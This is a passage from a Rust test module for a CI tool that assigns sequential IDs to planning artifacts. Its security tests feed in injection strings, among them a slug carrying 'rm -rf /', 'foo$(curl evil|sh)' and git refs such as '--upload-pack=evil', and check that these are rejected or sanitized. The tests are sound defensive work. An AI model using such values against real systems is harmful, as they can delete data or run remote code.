            max_in_base: Some(73),
            already_assigned: false,
            collision: Some("prd-conflict-74".to_string()),
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false, false).unwrap();
        assert_eq!(collisions.len(), 1);
        assert!(
            assignments.is_empty(),
            "collision must not produce assignment"
        );
        let after = fs::read_to_string(&path).unwrap();
        assert!(after.contains("assigned_number: null"));
    }

    #[test]
    fn render_human_summary_smoke() {
        let out = CiAssignIdOutput {
            schema_version: 1,
            ran_at: "2026-05-07T00:00:00Z".to_string(),
            pr: 123,
            repo: "ForgePlan/forgeplan".to_string(),
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            dry_run: false,
            assignments: vec![Assignment {
                slug: "prd-x".to_string(),
                kind: "prd".to_string(),
                path: "p.md".to_string(),
                predicted_number: Some(74),
                assigned_number: 74,
                max_in_base: Some(73),
                action: "assigned".to_string(),
            }],
            collisions: vec![],
            summary: Summary {
                total_candidates: 1,
                assigned: 1,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: 0,
            },
            commit_message_suggested: String::new(),
        };
        let s = render_human_summary(&out);
        assert!(s.contains("PR #123"));
        assert!(s.contains("PRD-074"));
        assert!(s.contains("prd-x"));
        assert!(s.contains("Summary"));
    }

    #[test]
    fn render_json_summary_smoke() {
        let out = CiAssignIdOutput {
            schema_version: 1,
            ran_at: "2026-05-07T00:00:00Z".to_string(),
            pr: 0,
            repo: String::new(),
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            dry_run: false,
            assignments: vec![],
            collisions: vec![],
            summary: Summary {
                total_candidates: 0,
                assigned: 0,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: 2,
            },
            commit_message_suggested: String::new(),
        };
        let json = render_json_summary(&out).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed["schema_version"], 1);
        assert_eq!(parsed["summary"]["exit_code"], 2);
        assert!(parsed["assignments"].is_array());
        assert!(parsed["collisions"].is_array());
    }

    #[test]
    fn build_commit_message_includes_assigned_only() {
        let assignments = vec![
            Assignment {
                slug: "prd-x".to_string(),
                kind: "prd".to_string(),
                path: "p.md".to_string(),
                predicted_number: None,
                assigned_number: 74,
                max_in_base: None,
                action: "assigned".to_string(),
            },
            Assignment {
                slug: "prd-y".to_string(),
                kind: "prd".to_string(),
                path: "y.md".to_string(),
                predicted_number: None,
                assigned_number: 75,
                max_in_base: None,
                action: "skipped_already_assigned".to_string(),
            },
        ];
        let msg = build_commit_message(123, &assignments);
        assert!(msg.contains("PR #123"));
        assert!(msg.contains("PRD-074"));
        assert!(msg.contains("prd-x"));
        assert!(!msg.contains("PRD-075"), "skipped should not appear");
    }

    #[test]
    fn dir_name_to_kind_round_trip() {
        for k in [
            ArtifactKind::Prd,
            ArtifactKind::Rfc,
            ArtifactKind::Adr,
            ArtifactKind::Epic,
            ArtifactKind::Spec,
            ArtifactKind::ProblemCard,
            ArtifactKind::SolutionPortfolio,
            ArtifactKind::EvidencePack,
            ArtifactKind::Note,
            ArtifactKind::RefreshReport,
            ArtifactKind::Memory,
        ] {
            assert_eq!(dir_name_to_kind(k.dir_name()), Some(k.clone()));
        }
        assert_eq!(dir_name_to_kind("unknown"), None);
    }

    #[test]
    fn run_no_candidates_exits_two() {
        let tmp = init_git_with_files(&[]);
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            json: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_NO_CANDIDATES);
    }

    #[test]
    fn run_full_assigns_and_writes() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        let new_path = tmp.path().join(".forgeplan/prds/prd-new.md");
        fs::write(&new_path, artifact("prd-new", 74, None)).unwrap();

        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_SUCCESS);
        let updated = fs::read_to_string(&new_path).unwrap();
        assert!(updated.contains("assigned_number: 74"));
    }

    #[test]
    fn run_dry_run_does_not_write() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        let new_path = tmp.path().join(".forgeplan/prds/prd-new.md");
        let original = artifact("prd-new", 74, None);
        fs::write(&new_path, &original).unwrap();
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            dry_run: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_SUCCESS);
        let after = fs::read_to_string(&new_path).unwrap();
        assert_eq!(after, original);
    }

    /// Tiny helper to drive an async future from a sync test.
    fn tokio_test_block<F: std::future::Future>(fut: F) -> F::Output {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        rt.block_on(fut)
    }

    // ---------------------------------------------------------------
    // PROB-060 Phase 0b — adversarial audit closure tests
    // ---------------------------------------------------------------

    /// FIX-2 Part B [CWE-94]: discover_candidates re-validates slug shape
    /// после frontmatter parse. Malformed slug coming from PR-controlled
    /// YAML (e.g. embedded newline, shell metacharacters) must be rejected
    /// before reaching commit_message_suggested.
    #[test]
    fn discover_candidates_rejects_malformed_slug() {
        // Slug с newline — would break `git commit -m "..."` quoting.
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-evil.md",
            "---\nslug: \"prd-evil\\nrm -rf /\"\nassigned_number: null\n---\n\nbody\n",
        )]);
        let result = discover_candidates(tmp.path());
        assert!(
            result.is_err(),
            "malformed slug must be rejected: {:?}",
            result.ok()
        );
    }

    /// FIX-2 Part B: even a slug that's just the wrong shape (uppercase,
    /// reserved prefix, etc.) must be rejected at read time.
    #[test]
    fn discover_candidates_rejects_uppercase_slug() {
        let tmp = make_ws(&[(
            ".forgeplan/prds/prd-mixed.md",
            "---\nslug: PRD-Auth\nassigned_number: null\n---\n\nbody\n",
        )]);
        let result = discover_candidates(tmp.path());
        assert!(
            result.is_err(),
            "uppercase slug must be rejected at read path"
        );
    }

    /// FIX-5 [CR-2]: when frontmatter is unparseable, surface a warning
    /// to stderr but continue с remaining candidates.
    #[test]
    fn discover_candidates_warns_on_parse_error_continues_others() {
        let tmp = make_ws(&[
            (
                ".forgeplan/prds/prd-good.md",
                &artifact("prd-good", 74, None),
            ),
            (
                ".forgeplan/prds/prd-bad.md",
                "---\nthis is :: not valid : yaml\n   bad: [unclosed\n---\nbody\n",
            ),
        ]);
        // We can't capture stderr cleanly от unit tests без extra
        // infrastructure, but we can assert the core invariant: 1 valid
        // candidate returned, no error propagated.
        let result = discover_candidates(tmp.path()).expect("must continue past parse error");
        assert_eq!(
            result.len(),
            1,
            "expected 1 valid candidate, got {result:?}"
        );
        assert_eq!(result[0].slug, "prd-good");
    }

    /// FIX-4 [CR-1]: when one candidate carries assigned_number=80 (from
    /// a previous workflow run) и other two carry null, the sequence
    /// counter must absorb 80 — not start от max_in_base = 73.
    /// Pre-fix output would be: 80 (skip) + 74 + 75 — duplicates!
    #[test]
    fn compute_plan_mixed_assigned_and_null_no_duplicates() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        // Three candidates: one already 80, two null.
        let candidates = vec![
            Candidate {
                slug: "prd-already".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-already.md"),
                predicted_number: Some(80),
                current_assigned: Some(80),
            },
            Candidate {
                slug: "prd-new-a".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-a.md"),
                predicted_number: None,
                current_assigned: None,
            },
            Candidate {
                slug: "prd-new-b".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new-b.md"),
                predicted_number: None,
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 3);
        // First (already-assigned) keeps 80.
        let already = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-already")
            .unwrap();
        assert_eq!(already.assigned_number, 80);
        assert!(already.already_assigned);
        // Next two get 81, 82 — NOT 74, 75 (which would collide с 80).
        let a = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-new-a")
            .unwrap();
        let b = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-new-b")
            .unwrap();
        let mut nums = [a.assigned_number, b.assigned_number];
        nums.sort();
        assert_eq!(
            nums,
            [81, 82],
            "expected 81+82 после absorbing 80, got {nums:?}"
        );
    }

    /// FIX-4 edge case: existing assigned_number is *below* max_in_base.
    /// Sequence stays at max_in_base; new candidates get max+1, max+2.
    /// No regression to gradient-correct happy path.
    #[test]
    fn compute_plan_max_with_explicit_existing_below_base() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-base.md",
            &artifact("prd-base", 73, Some("73")),
        )]);
        let candidates = vec![
            Candidate {
                slug: "prd-old".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-old.md"),
                predicted_number: None,
                current_assigned: Some(70), // below base max
            },
            Candidate {
                slug: "prd-new".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new.md"),
                predicted_number: None,
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        let new_item = plan.iter().find(|p| p.candidate.slug == "prd-new").unwrap();
        // max(seq=73, existing=70) = 73; new gets 74.
        assert_eq!(new_item.assigned_number, 74);
    }

    // FIX-6 [CR-5]: display_id renders canonical prefixes (PROB/SOL/EVID/REF).

    #[test]
    fn display_id_renders_problem_with_canonical_prefix() {
        assert_eq!(display_id("problem", 60), "PROB-060");
    }

    #[test]
    fn display_id_renders_solution_with_canonical_prefix() {
        assert_eq!(display_id("solution", 1), "SOL-001");
    }

    #[test]
    fn display_id_renders_evidence_with_canonical_prefix() {
        assert_eq!(display_id("evidence", 114), "EVID-114");
    }

    #[test]
    fn display_id_renders_refresh_with_canonical_prefix() {
        assert_eq!(display_id("refresh", 5), "REF-005");
    }

    #[test]
    fn display_id_renders_remaining_kinds_unchanged() {
        // Pre-fix kinds that already produced the right prefix must not regress.
        assert_eq!(display_id("prd", 76), "PRD-076");
        assert_eq!(display_id("rfc", 9), "RFC-009");
        assert_eq!(display_id("adr", 12), "ADR-012");
        assert_eq!(display_id("epic", 1), "EPIC-001");
        assert_eq!(display_id("spec", 5), "SPEC-005");
        assert_eq!(display_id("note", 1), "NOTE-001");
        assert_eq!(display_id("memory", 1), "MEM-001");
    }

    #[test]
    fn build_commit_message_uses_canonical_prefix_for_problem() {
        let assignments = vec![Assignment {
            slug: "prob-api-panic".to_string(),
            kind: "problem".to_string(),
            path: "p.md".to_string(),
            predicted_number: None,
            assigned_number: 60,
            max_in_base: None,
            action: "assigned".to_string(),
        }];
        let msg = build_commit_message(123, &assignments);
        assert!(msg.contains("PROB-060"), "expected PROB-060, got: {msg}");
        assert!(
            !msg.contains("PROBLEM-060"),
            "must not use stem template_key"
        );
    }

    // FIX-2 Part C [CWE-94]: sanitize_for_commit_msg.

    #[test]
    fn sanitize_for_commit_msg_passes_clean_slug() {
        assert_eq!(
            sanitize_for_commit_msg("prd-auth-system"),
            "prd-auth-system"
        );
        assert_eq!(sanitize_for_commit_msg("evid-114"), "evid-114");
        assert_eq!(sanitize_for_commit_msg("v0.29.0"), "v0.29.0");
    }

    #[test]
    fn sanitize_for_commit_msg_strips_shell_metacharacters() {
        // "foo$(curl evil|sh)" → 'foo' + '$' + '(' + 'curl' + ' ' + 'evil'
        //   + '|' + 'sh' + ')'  →  'foo' + '_' + '_' + 'curl' + '_' + 'evil'
        //   + '_' + 'sh' + '_'
        assert_eq!(
            sanitize_for_commit_msg("foo$(curl evil|sh)"),
            "foo__curl_evil_sh_"
        );
        assert_eq!(sanitize_for_commit_msg("foo`evil`"), "foo_evil_");
        assert_eq!(sanitize_for_commit_msg("foo\"evil\""), "foo_evil_");
        assert_eq!(sanitize_for_commit_msg("foo'evil'"), "foo_evil_");
        assert_eq!(sanitize_for_commit_msg("foo;rm -rf"), "foo_rm_-rf");
    }

    #[test]
    fn sanitize_for_commit_msg_strips_control_chars() {
        assert_eq!(sanitize_for_commit_msg("foo\nbar"), "foo_bar");
        assert_eq!(sanitize_for_commit_msg("foo\tbar"), "foo_bar");
        assert_eq!(sanitize_for_commit_msg("foo\rbar"), "foo_bar");
        assert_eq!(sanitize_for_commit_msg("foo\x00bar"), "foo_bar");
    }

    /// Defense-in-depth integration: a slug что-то somehow bypasses
    /// validate_slug should still produce a sanitized commit message.
    /// Direct call to build_commit_message с tampered slug.
    #[test]
    fn build_commit_message_sanitizes_slug_in_body() {
        let assignments = vec![Assignment {
            slug: "prd-a$(curl evil|sh)".to_string(),
            kind: "prd".to_string(),
            path: "p.md".to_string(),
            predicted_number: None,
            assigned_number: 1,
            max_in_base: None,
            action: "assigned".to_string(),
        }];
        let msg = build_commit_message(1, &assignments);
        assert!(
            !msg.contains("$("),
            "shell substitution syntax must be neutralized: {msg}"
        );
        assert!(!msg.contains('|'), "pipe must be neutralized: {msg}");
        assert!(!msg.contains('`'), "backtick must be neutralized: {msg}");
    }

    // FIX-1 [CWE-88] propagation: run() rejects bad refs early.

    #[test]
    fn run_rejects_malicious_base_ref() {
        let tmp = init_git_with_files(&[]);
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "--upload-pack=evil".to_string(),
            head: "HEAD".to_string(),
            json: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_CONFIG_ERROR);
    }

    #[test]
    fn run_rejects_malicious_head_ref() {
        let tmp = init_git_with_files(&[]);
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            head: "-rf".to_string(),
            json: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_CONFIG_ERROR);
    }
}
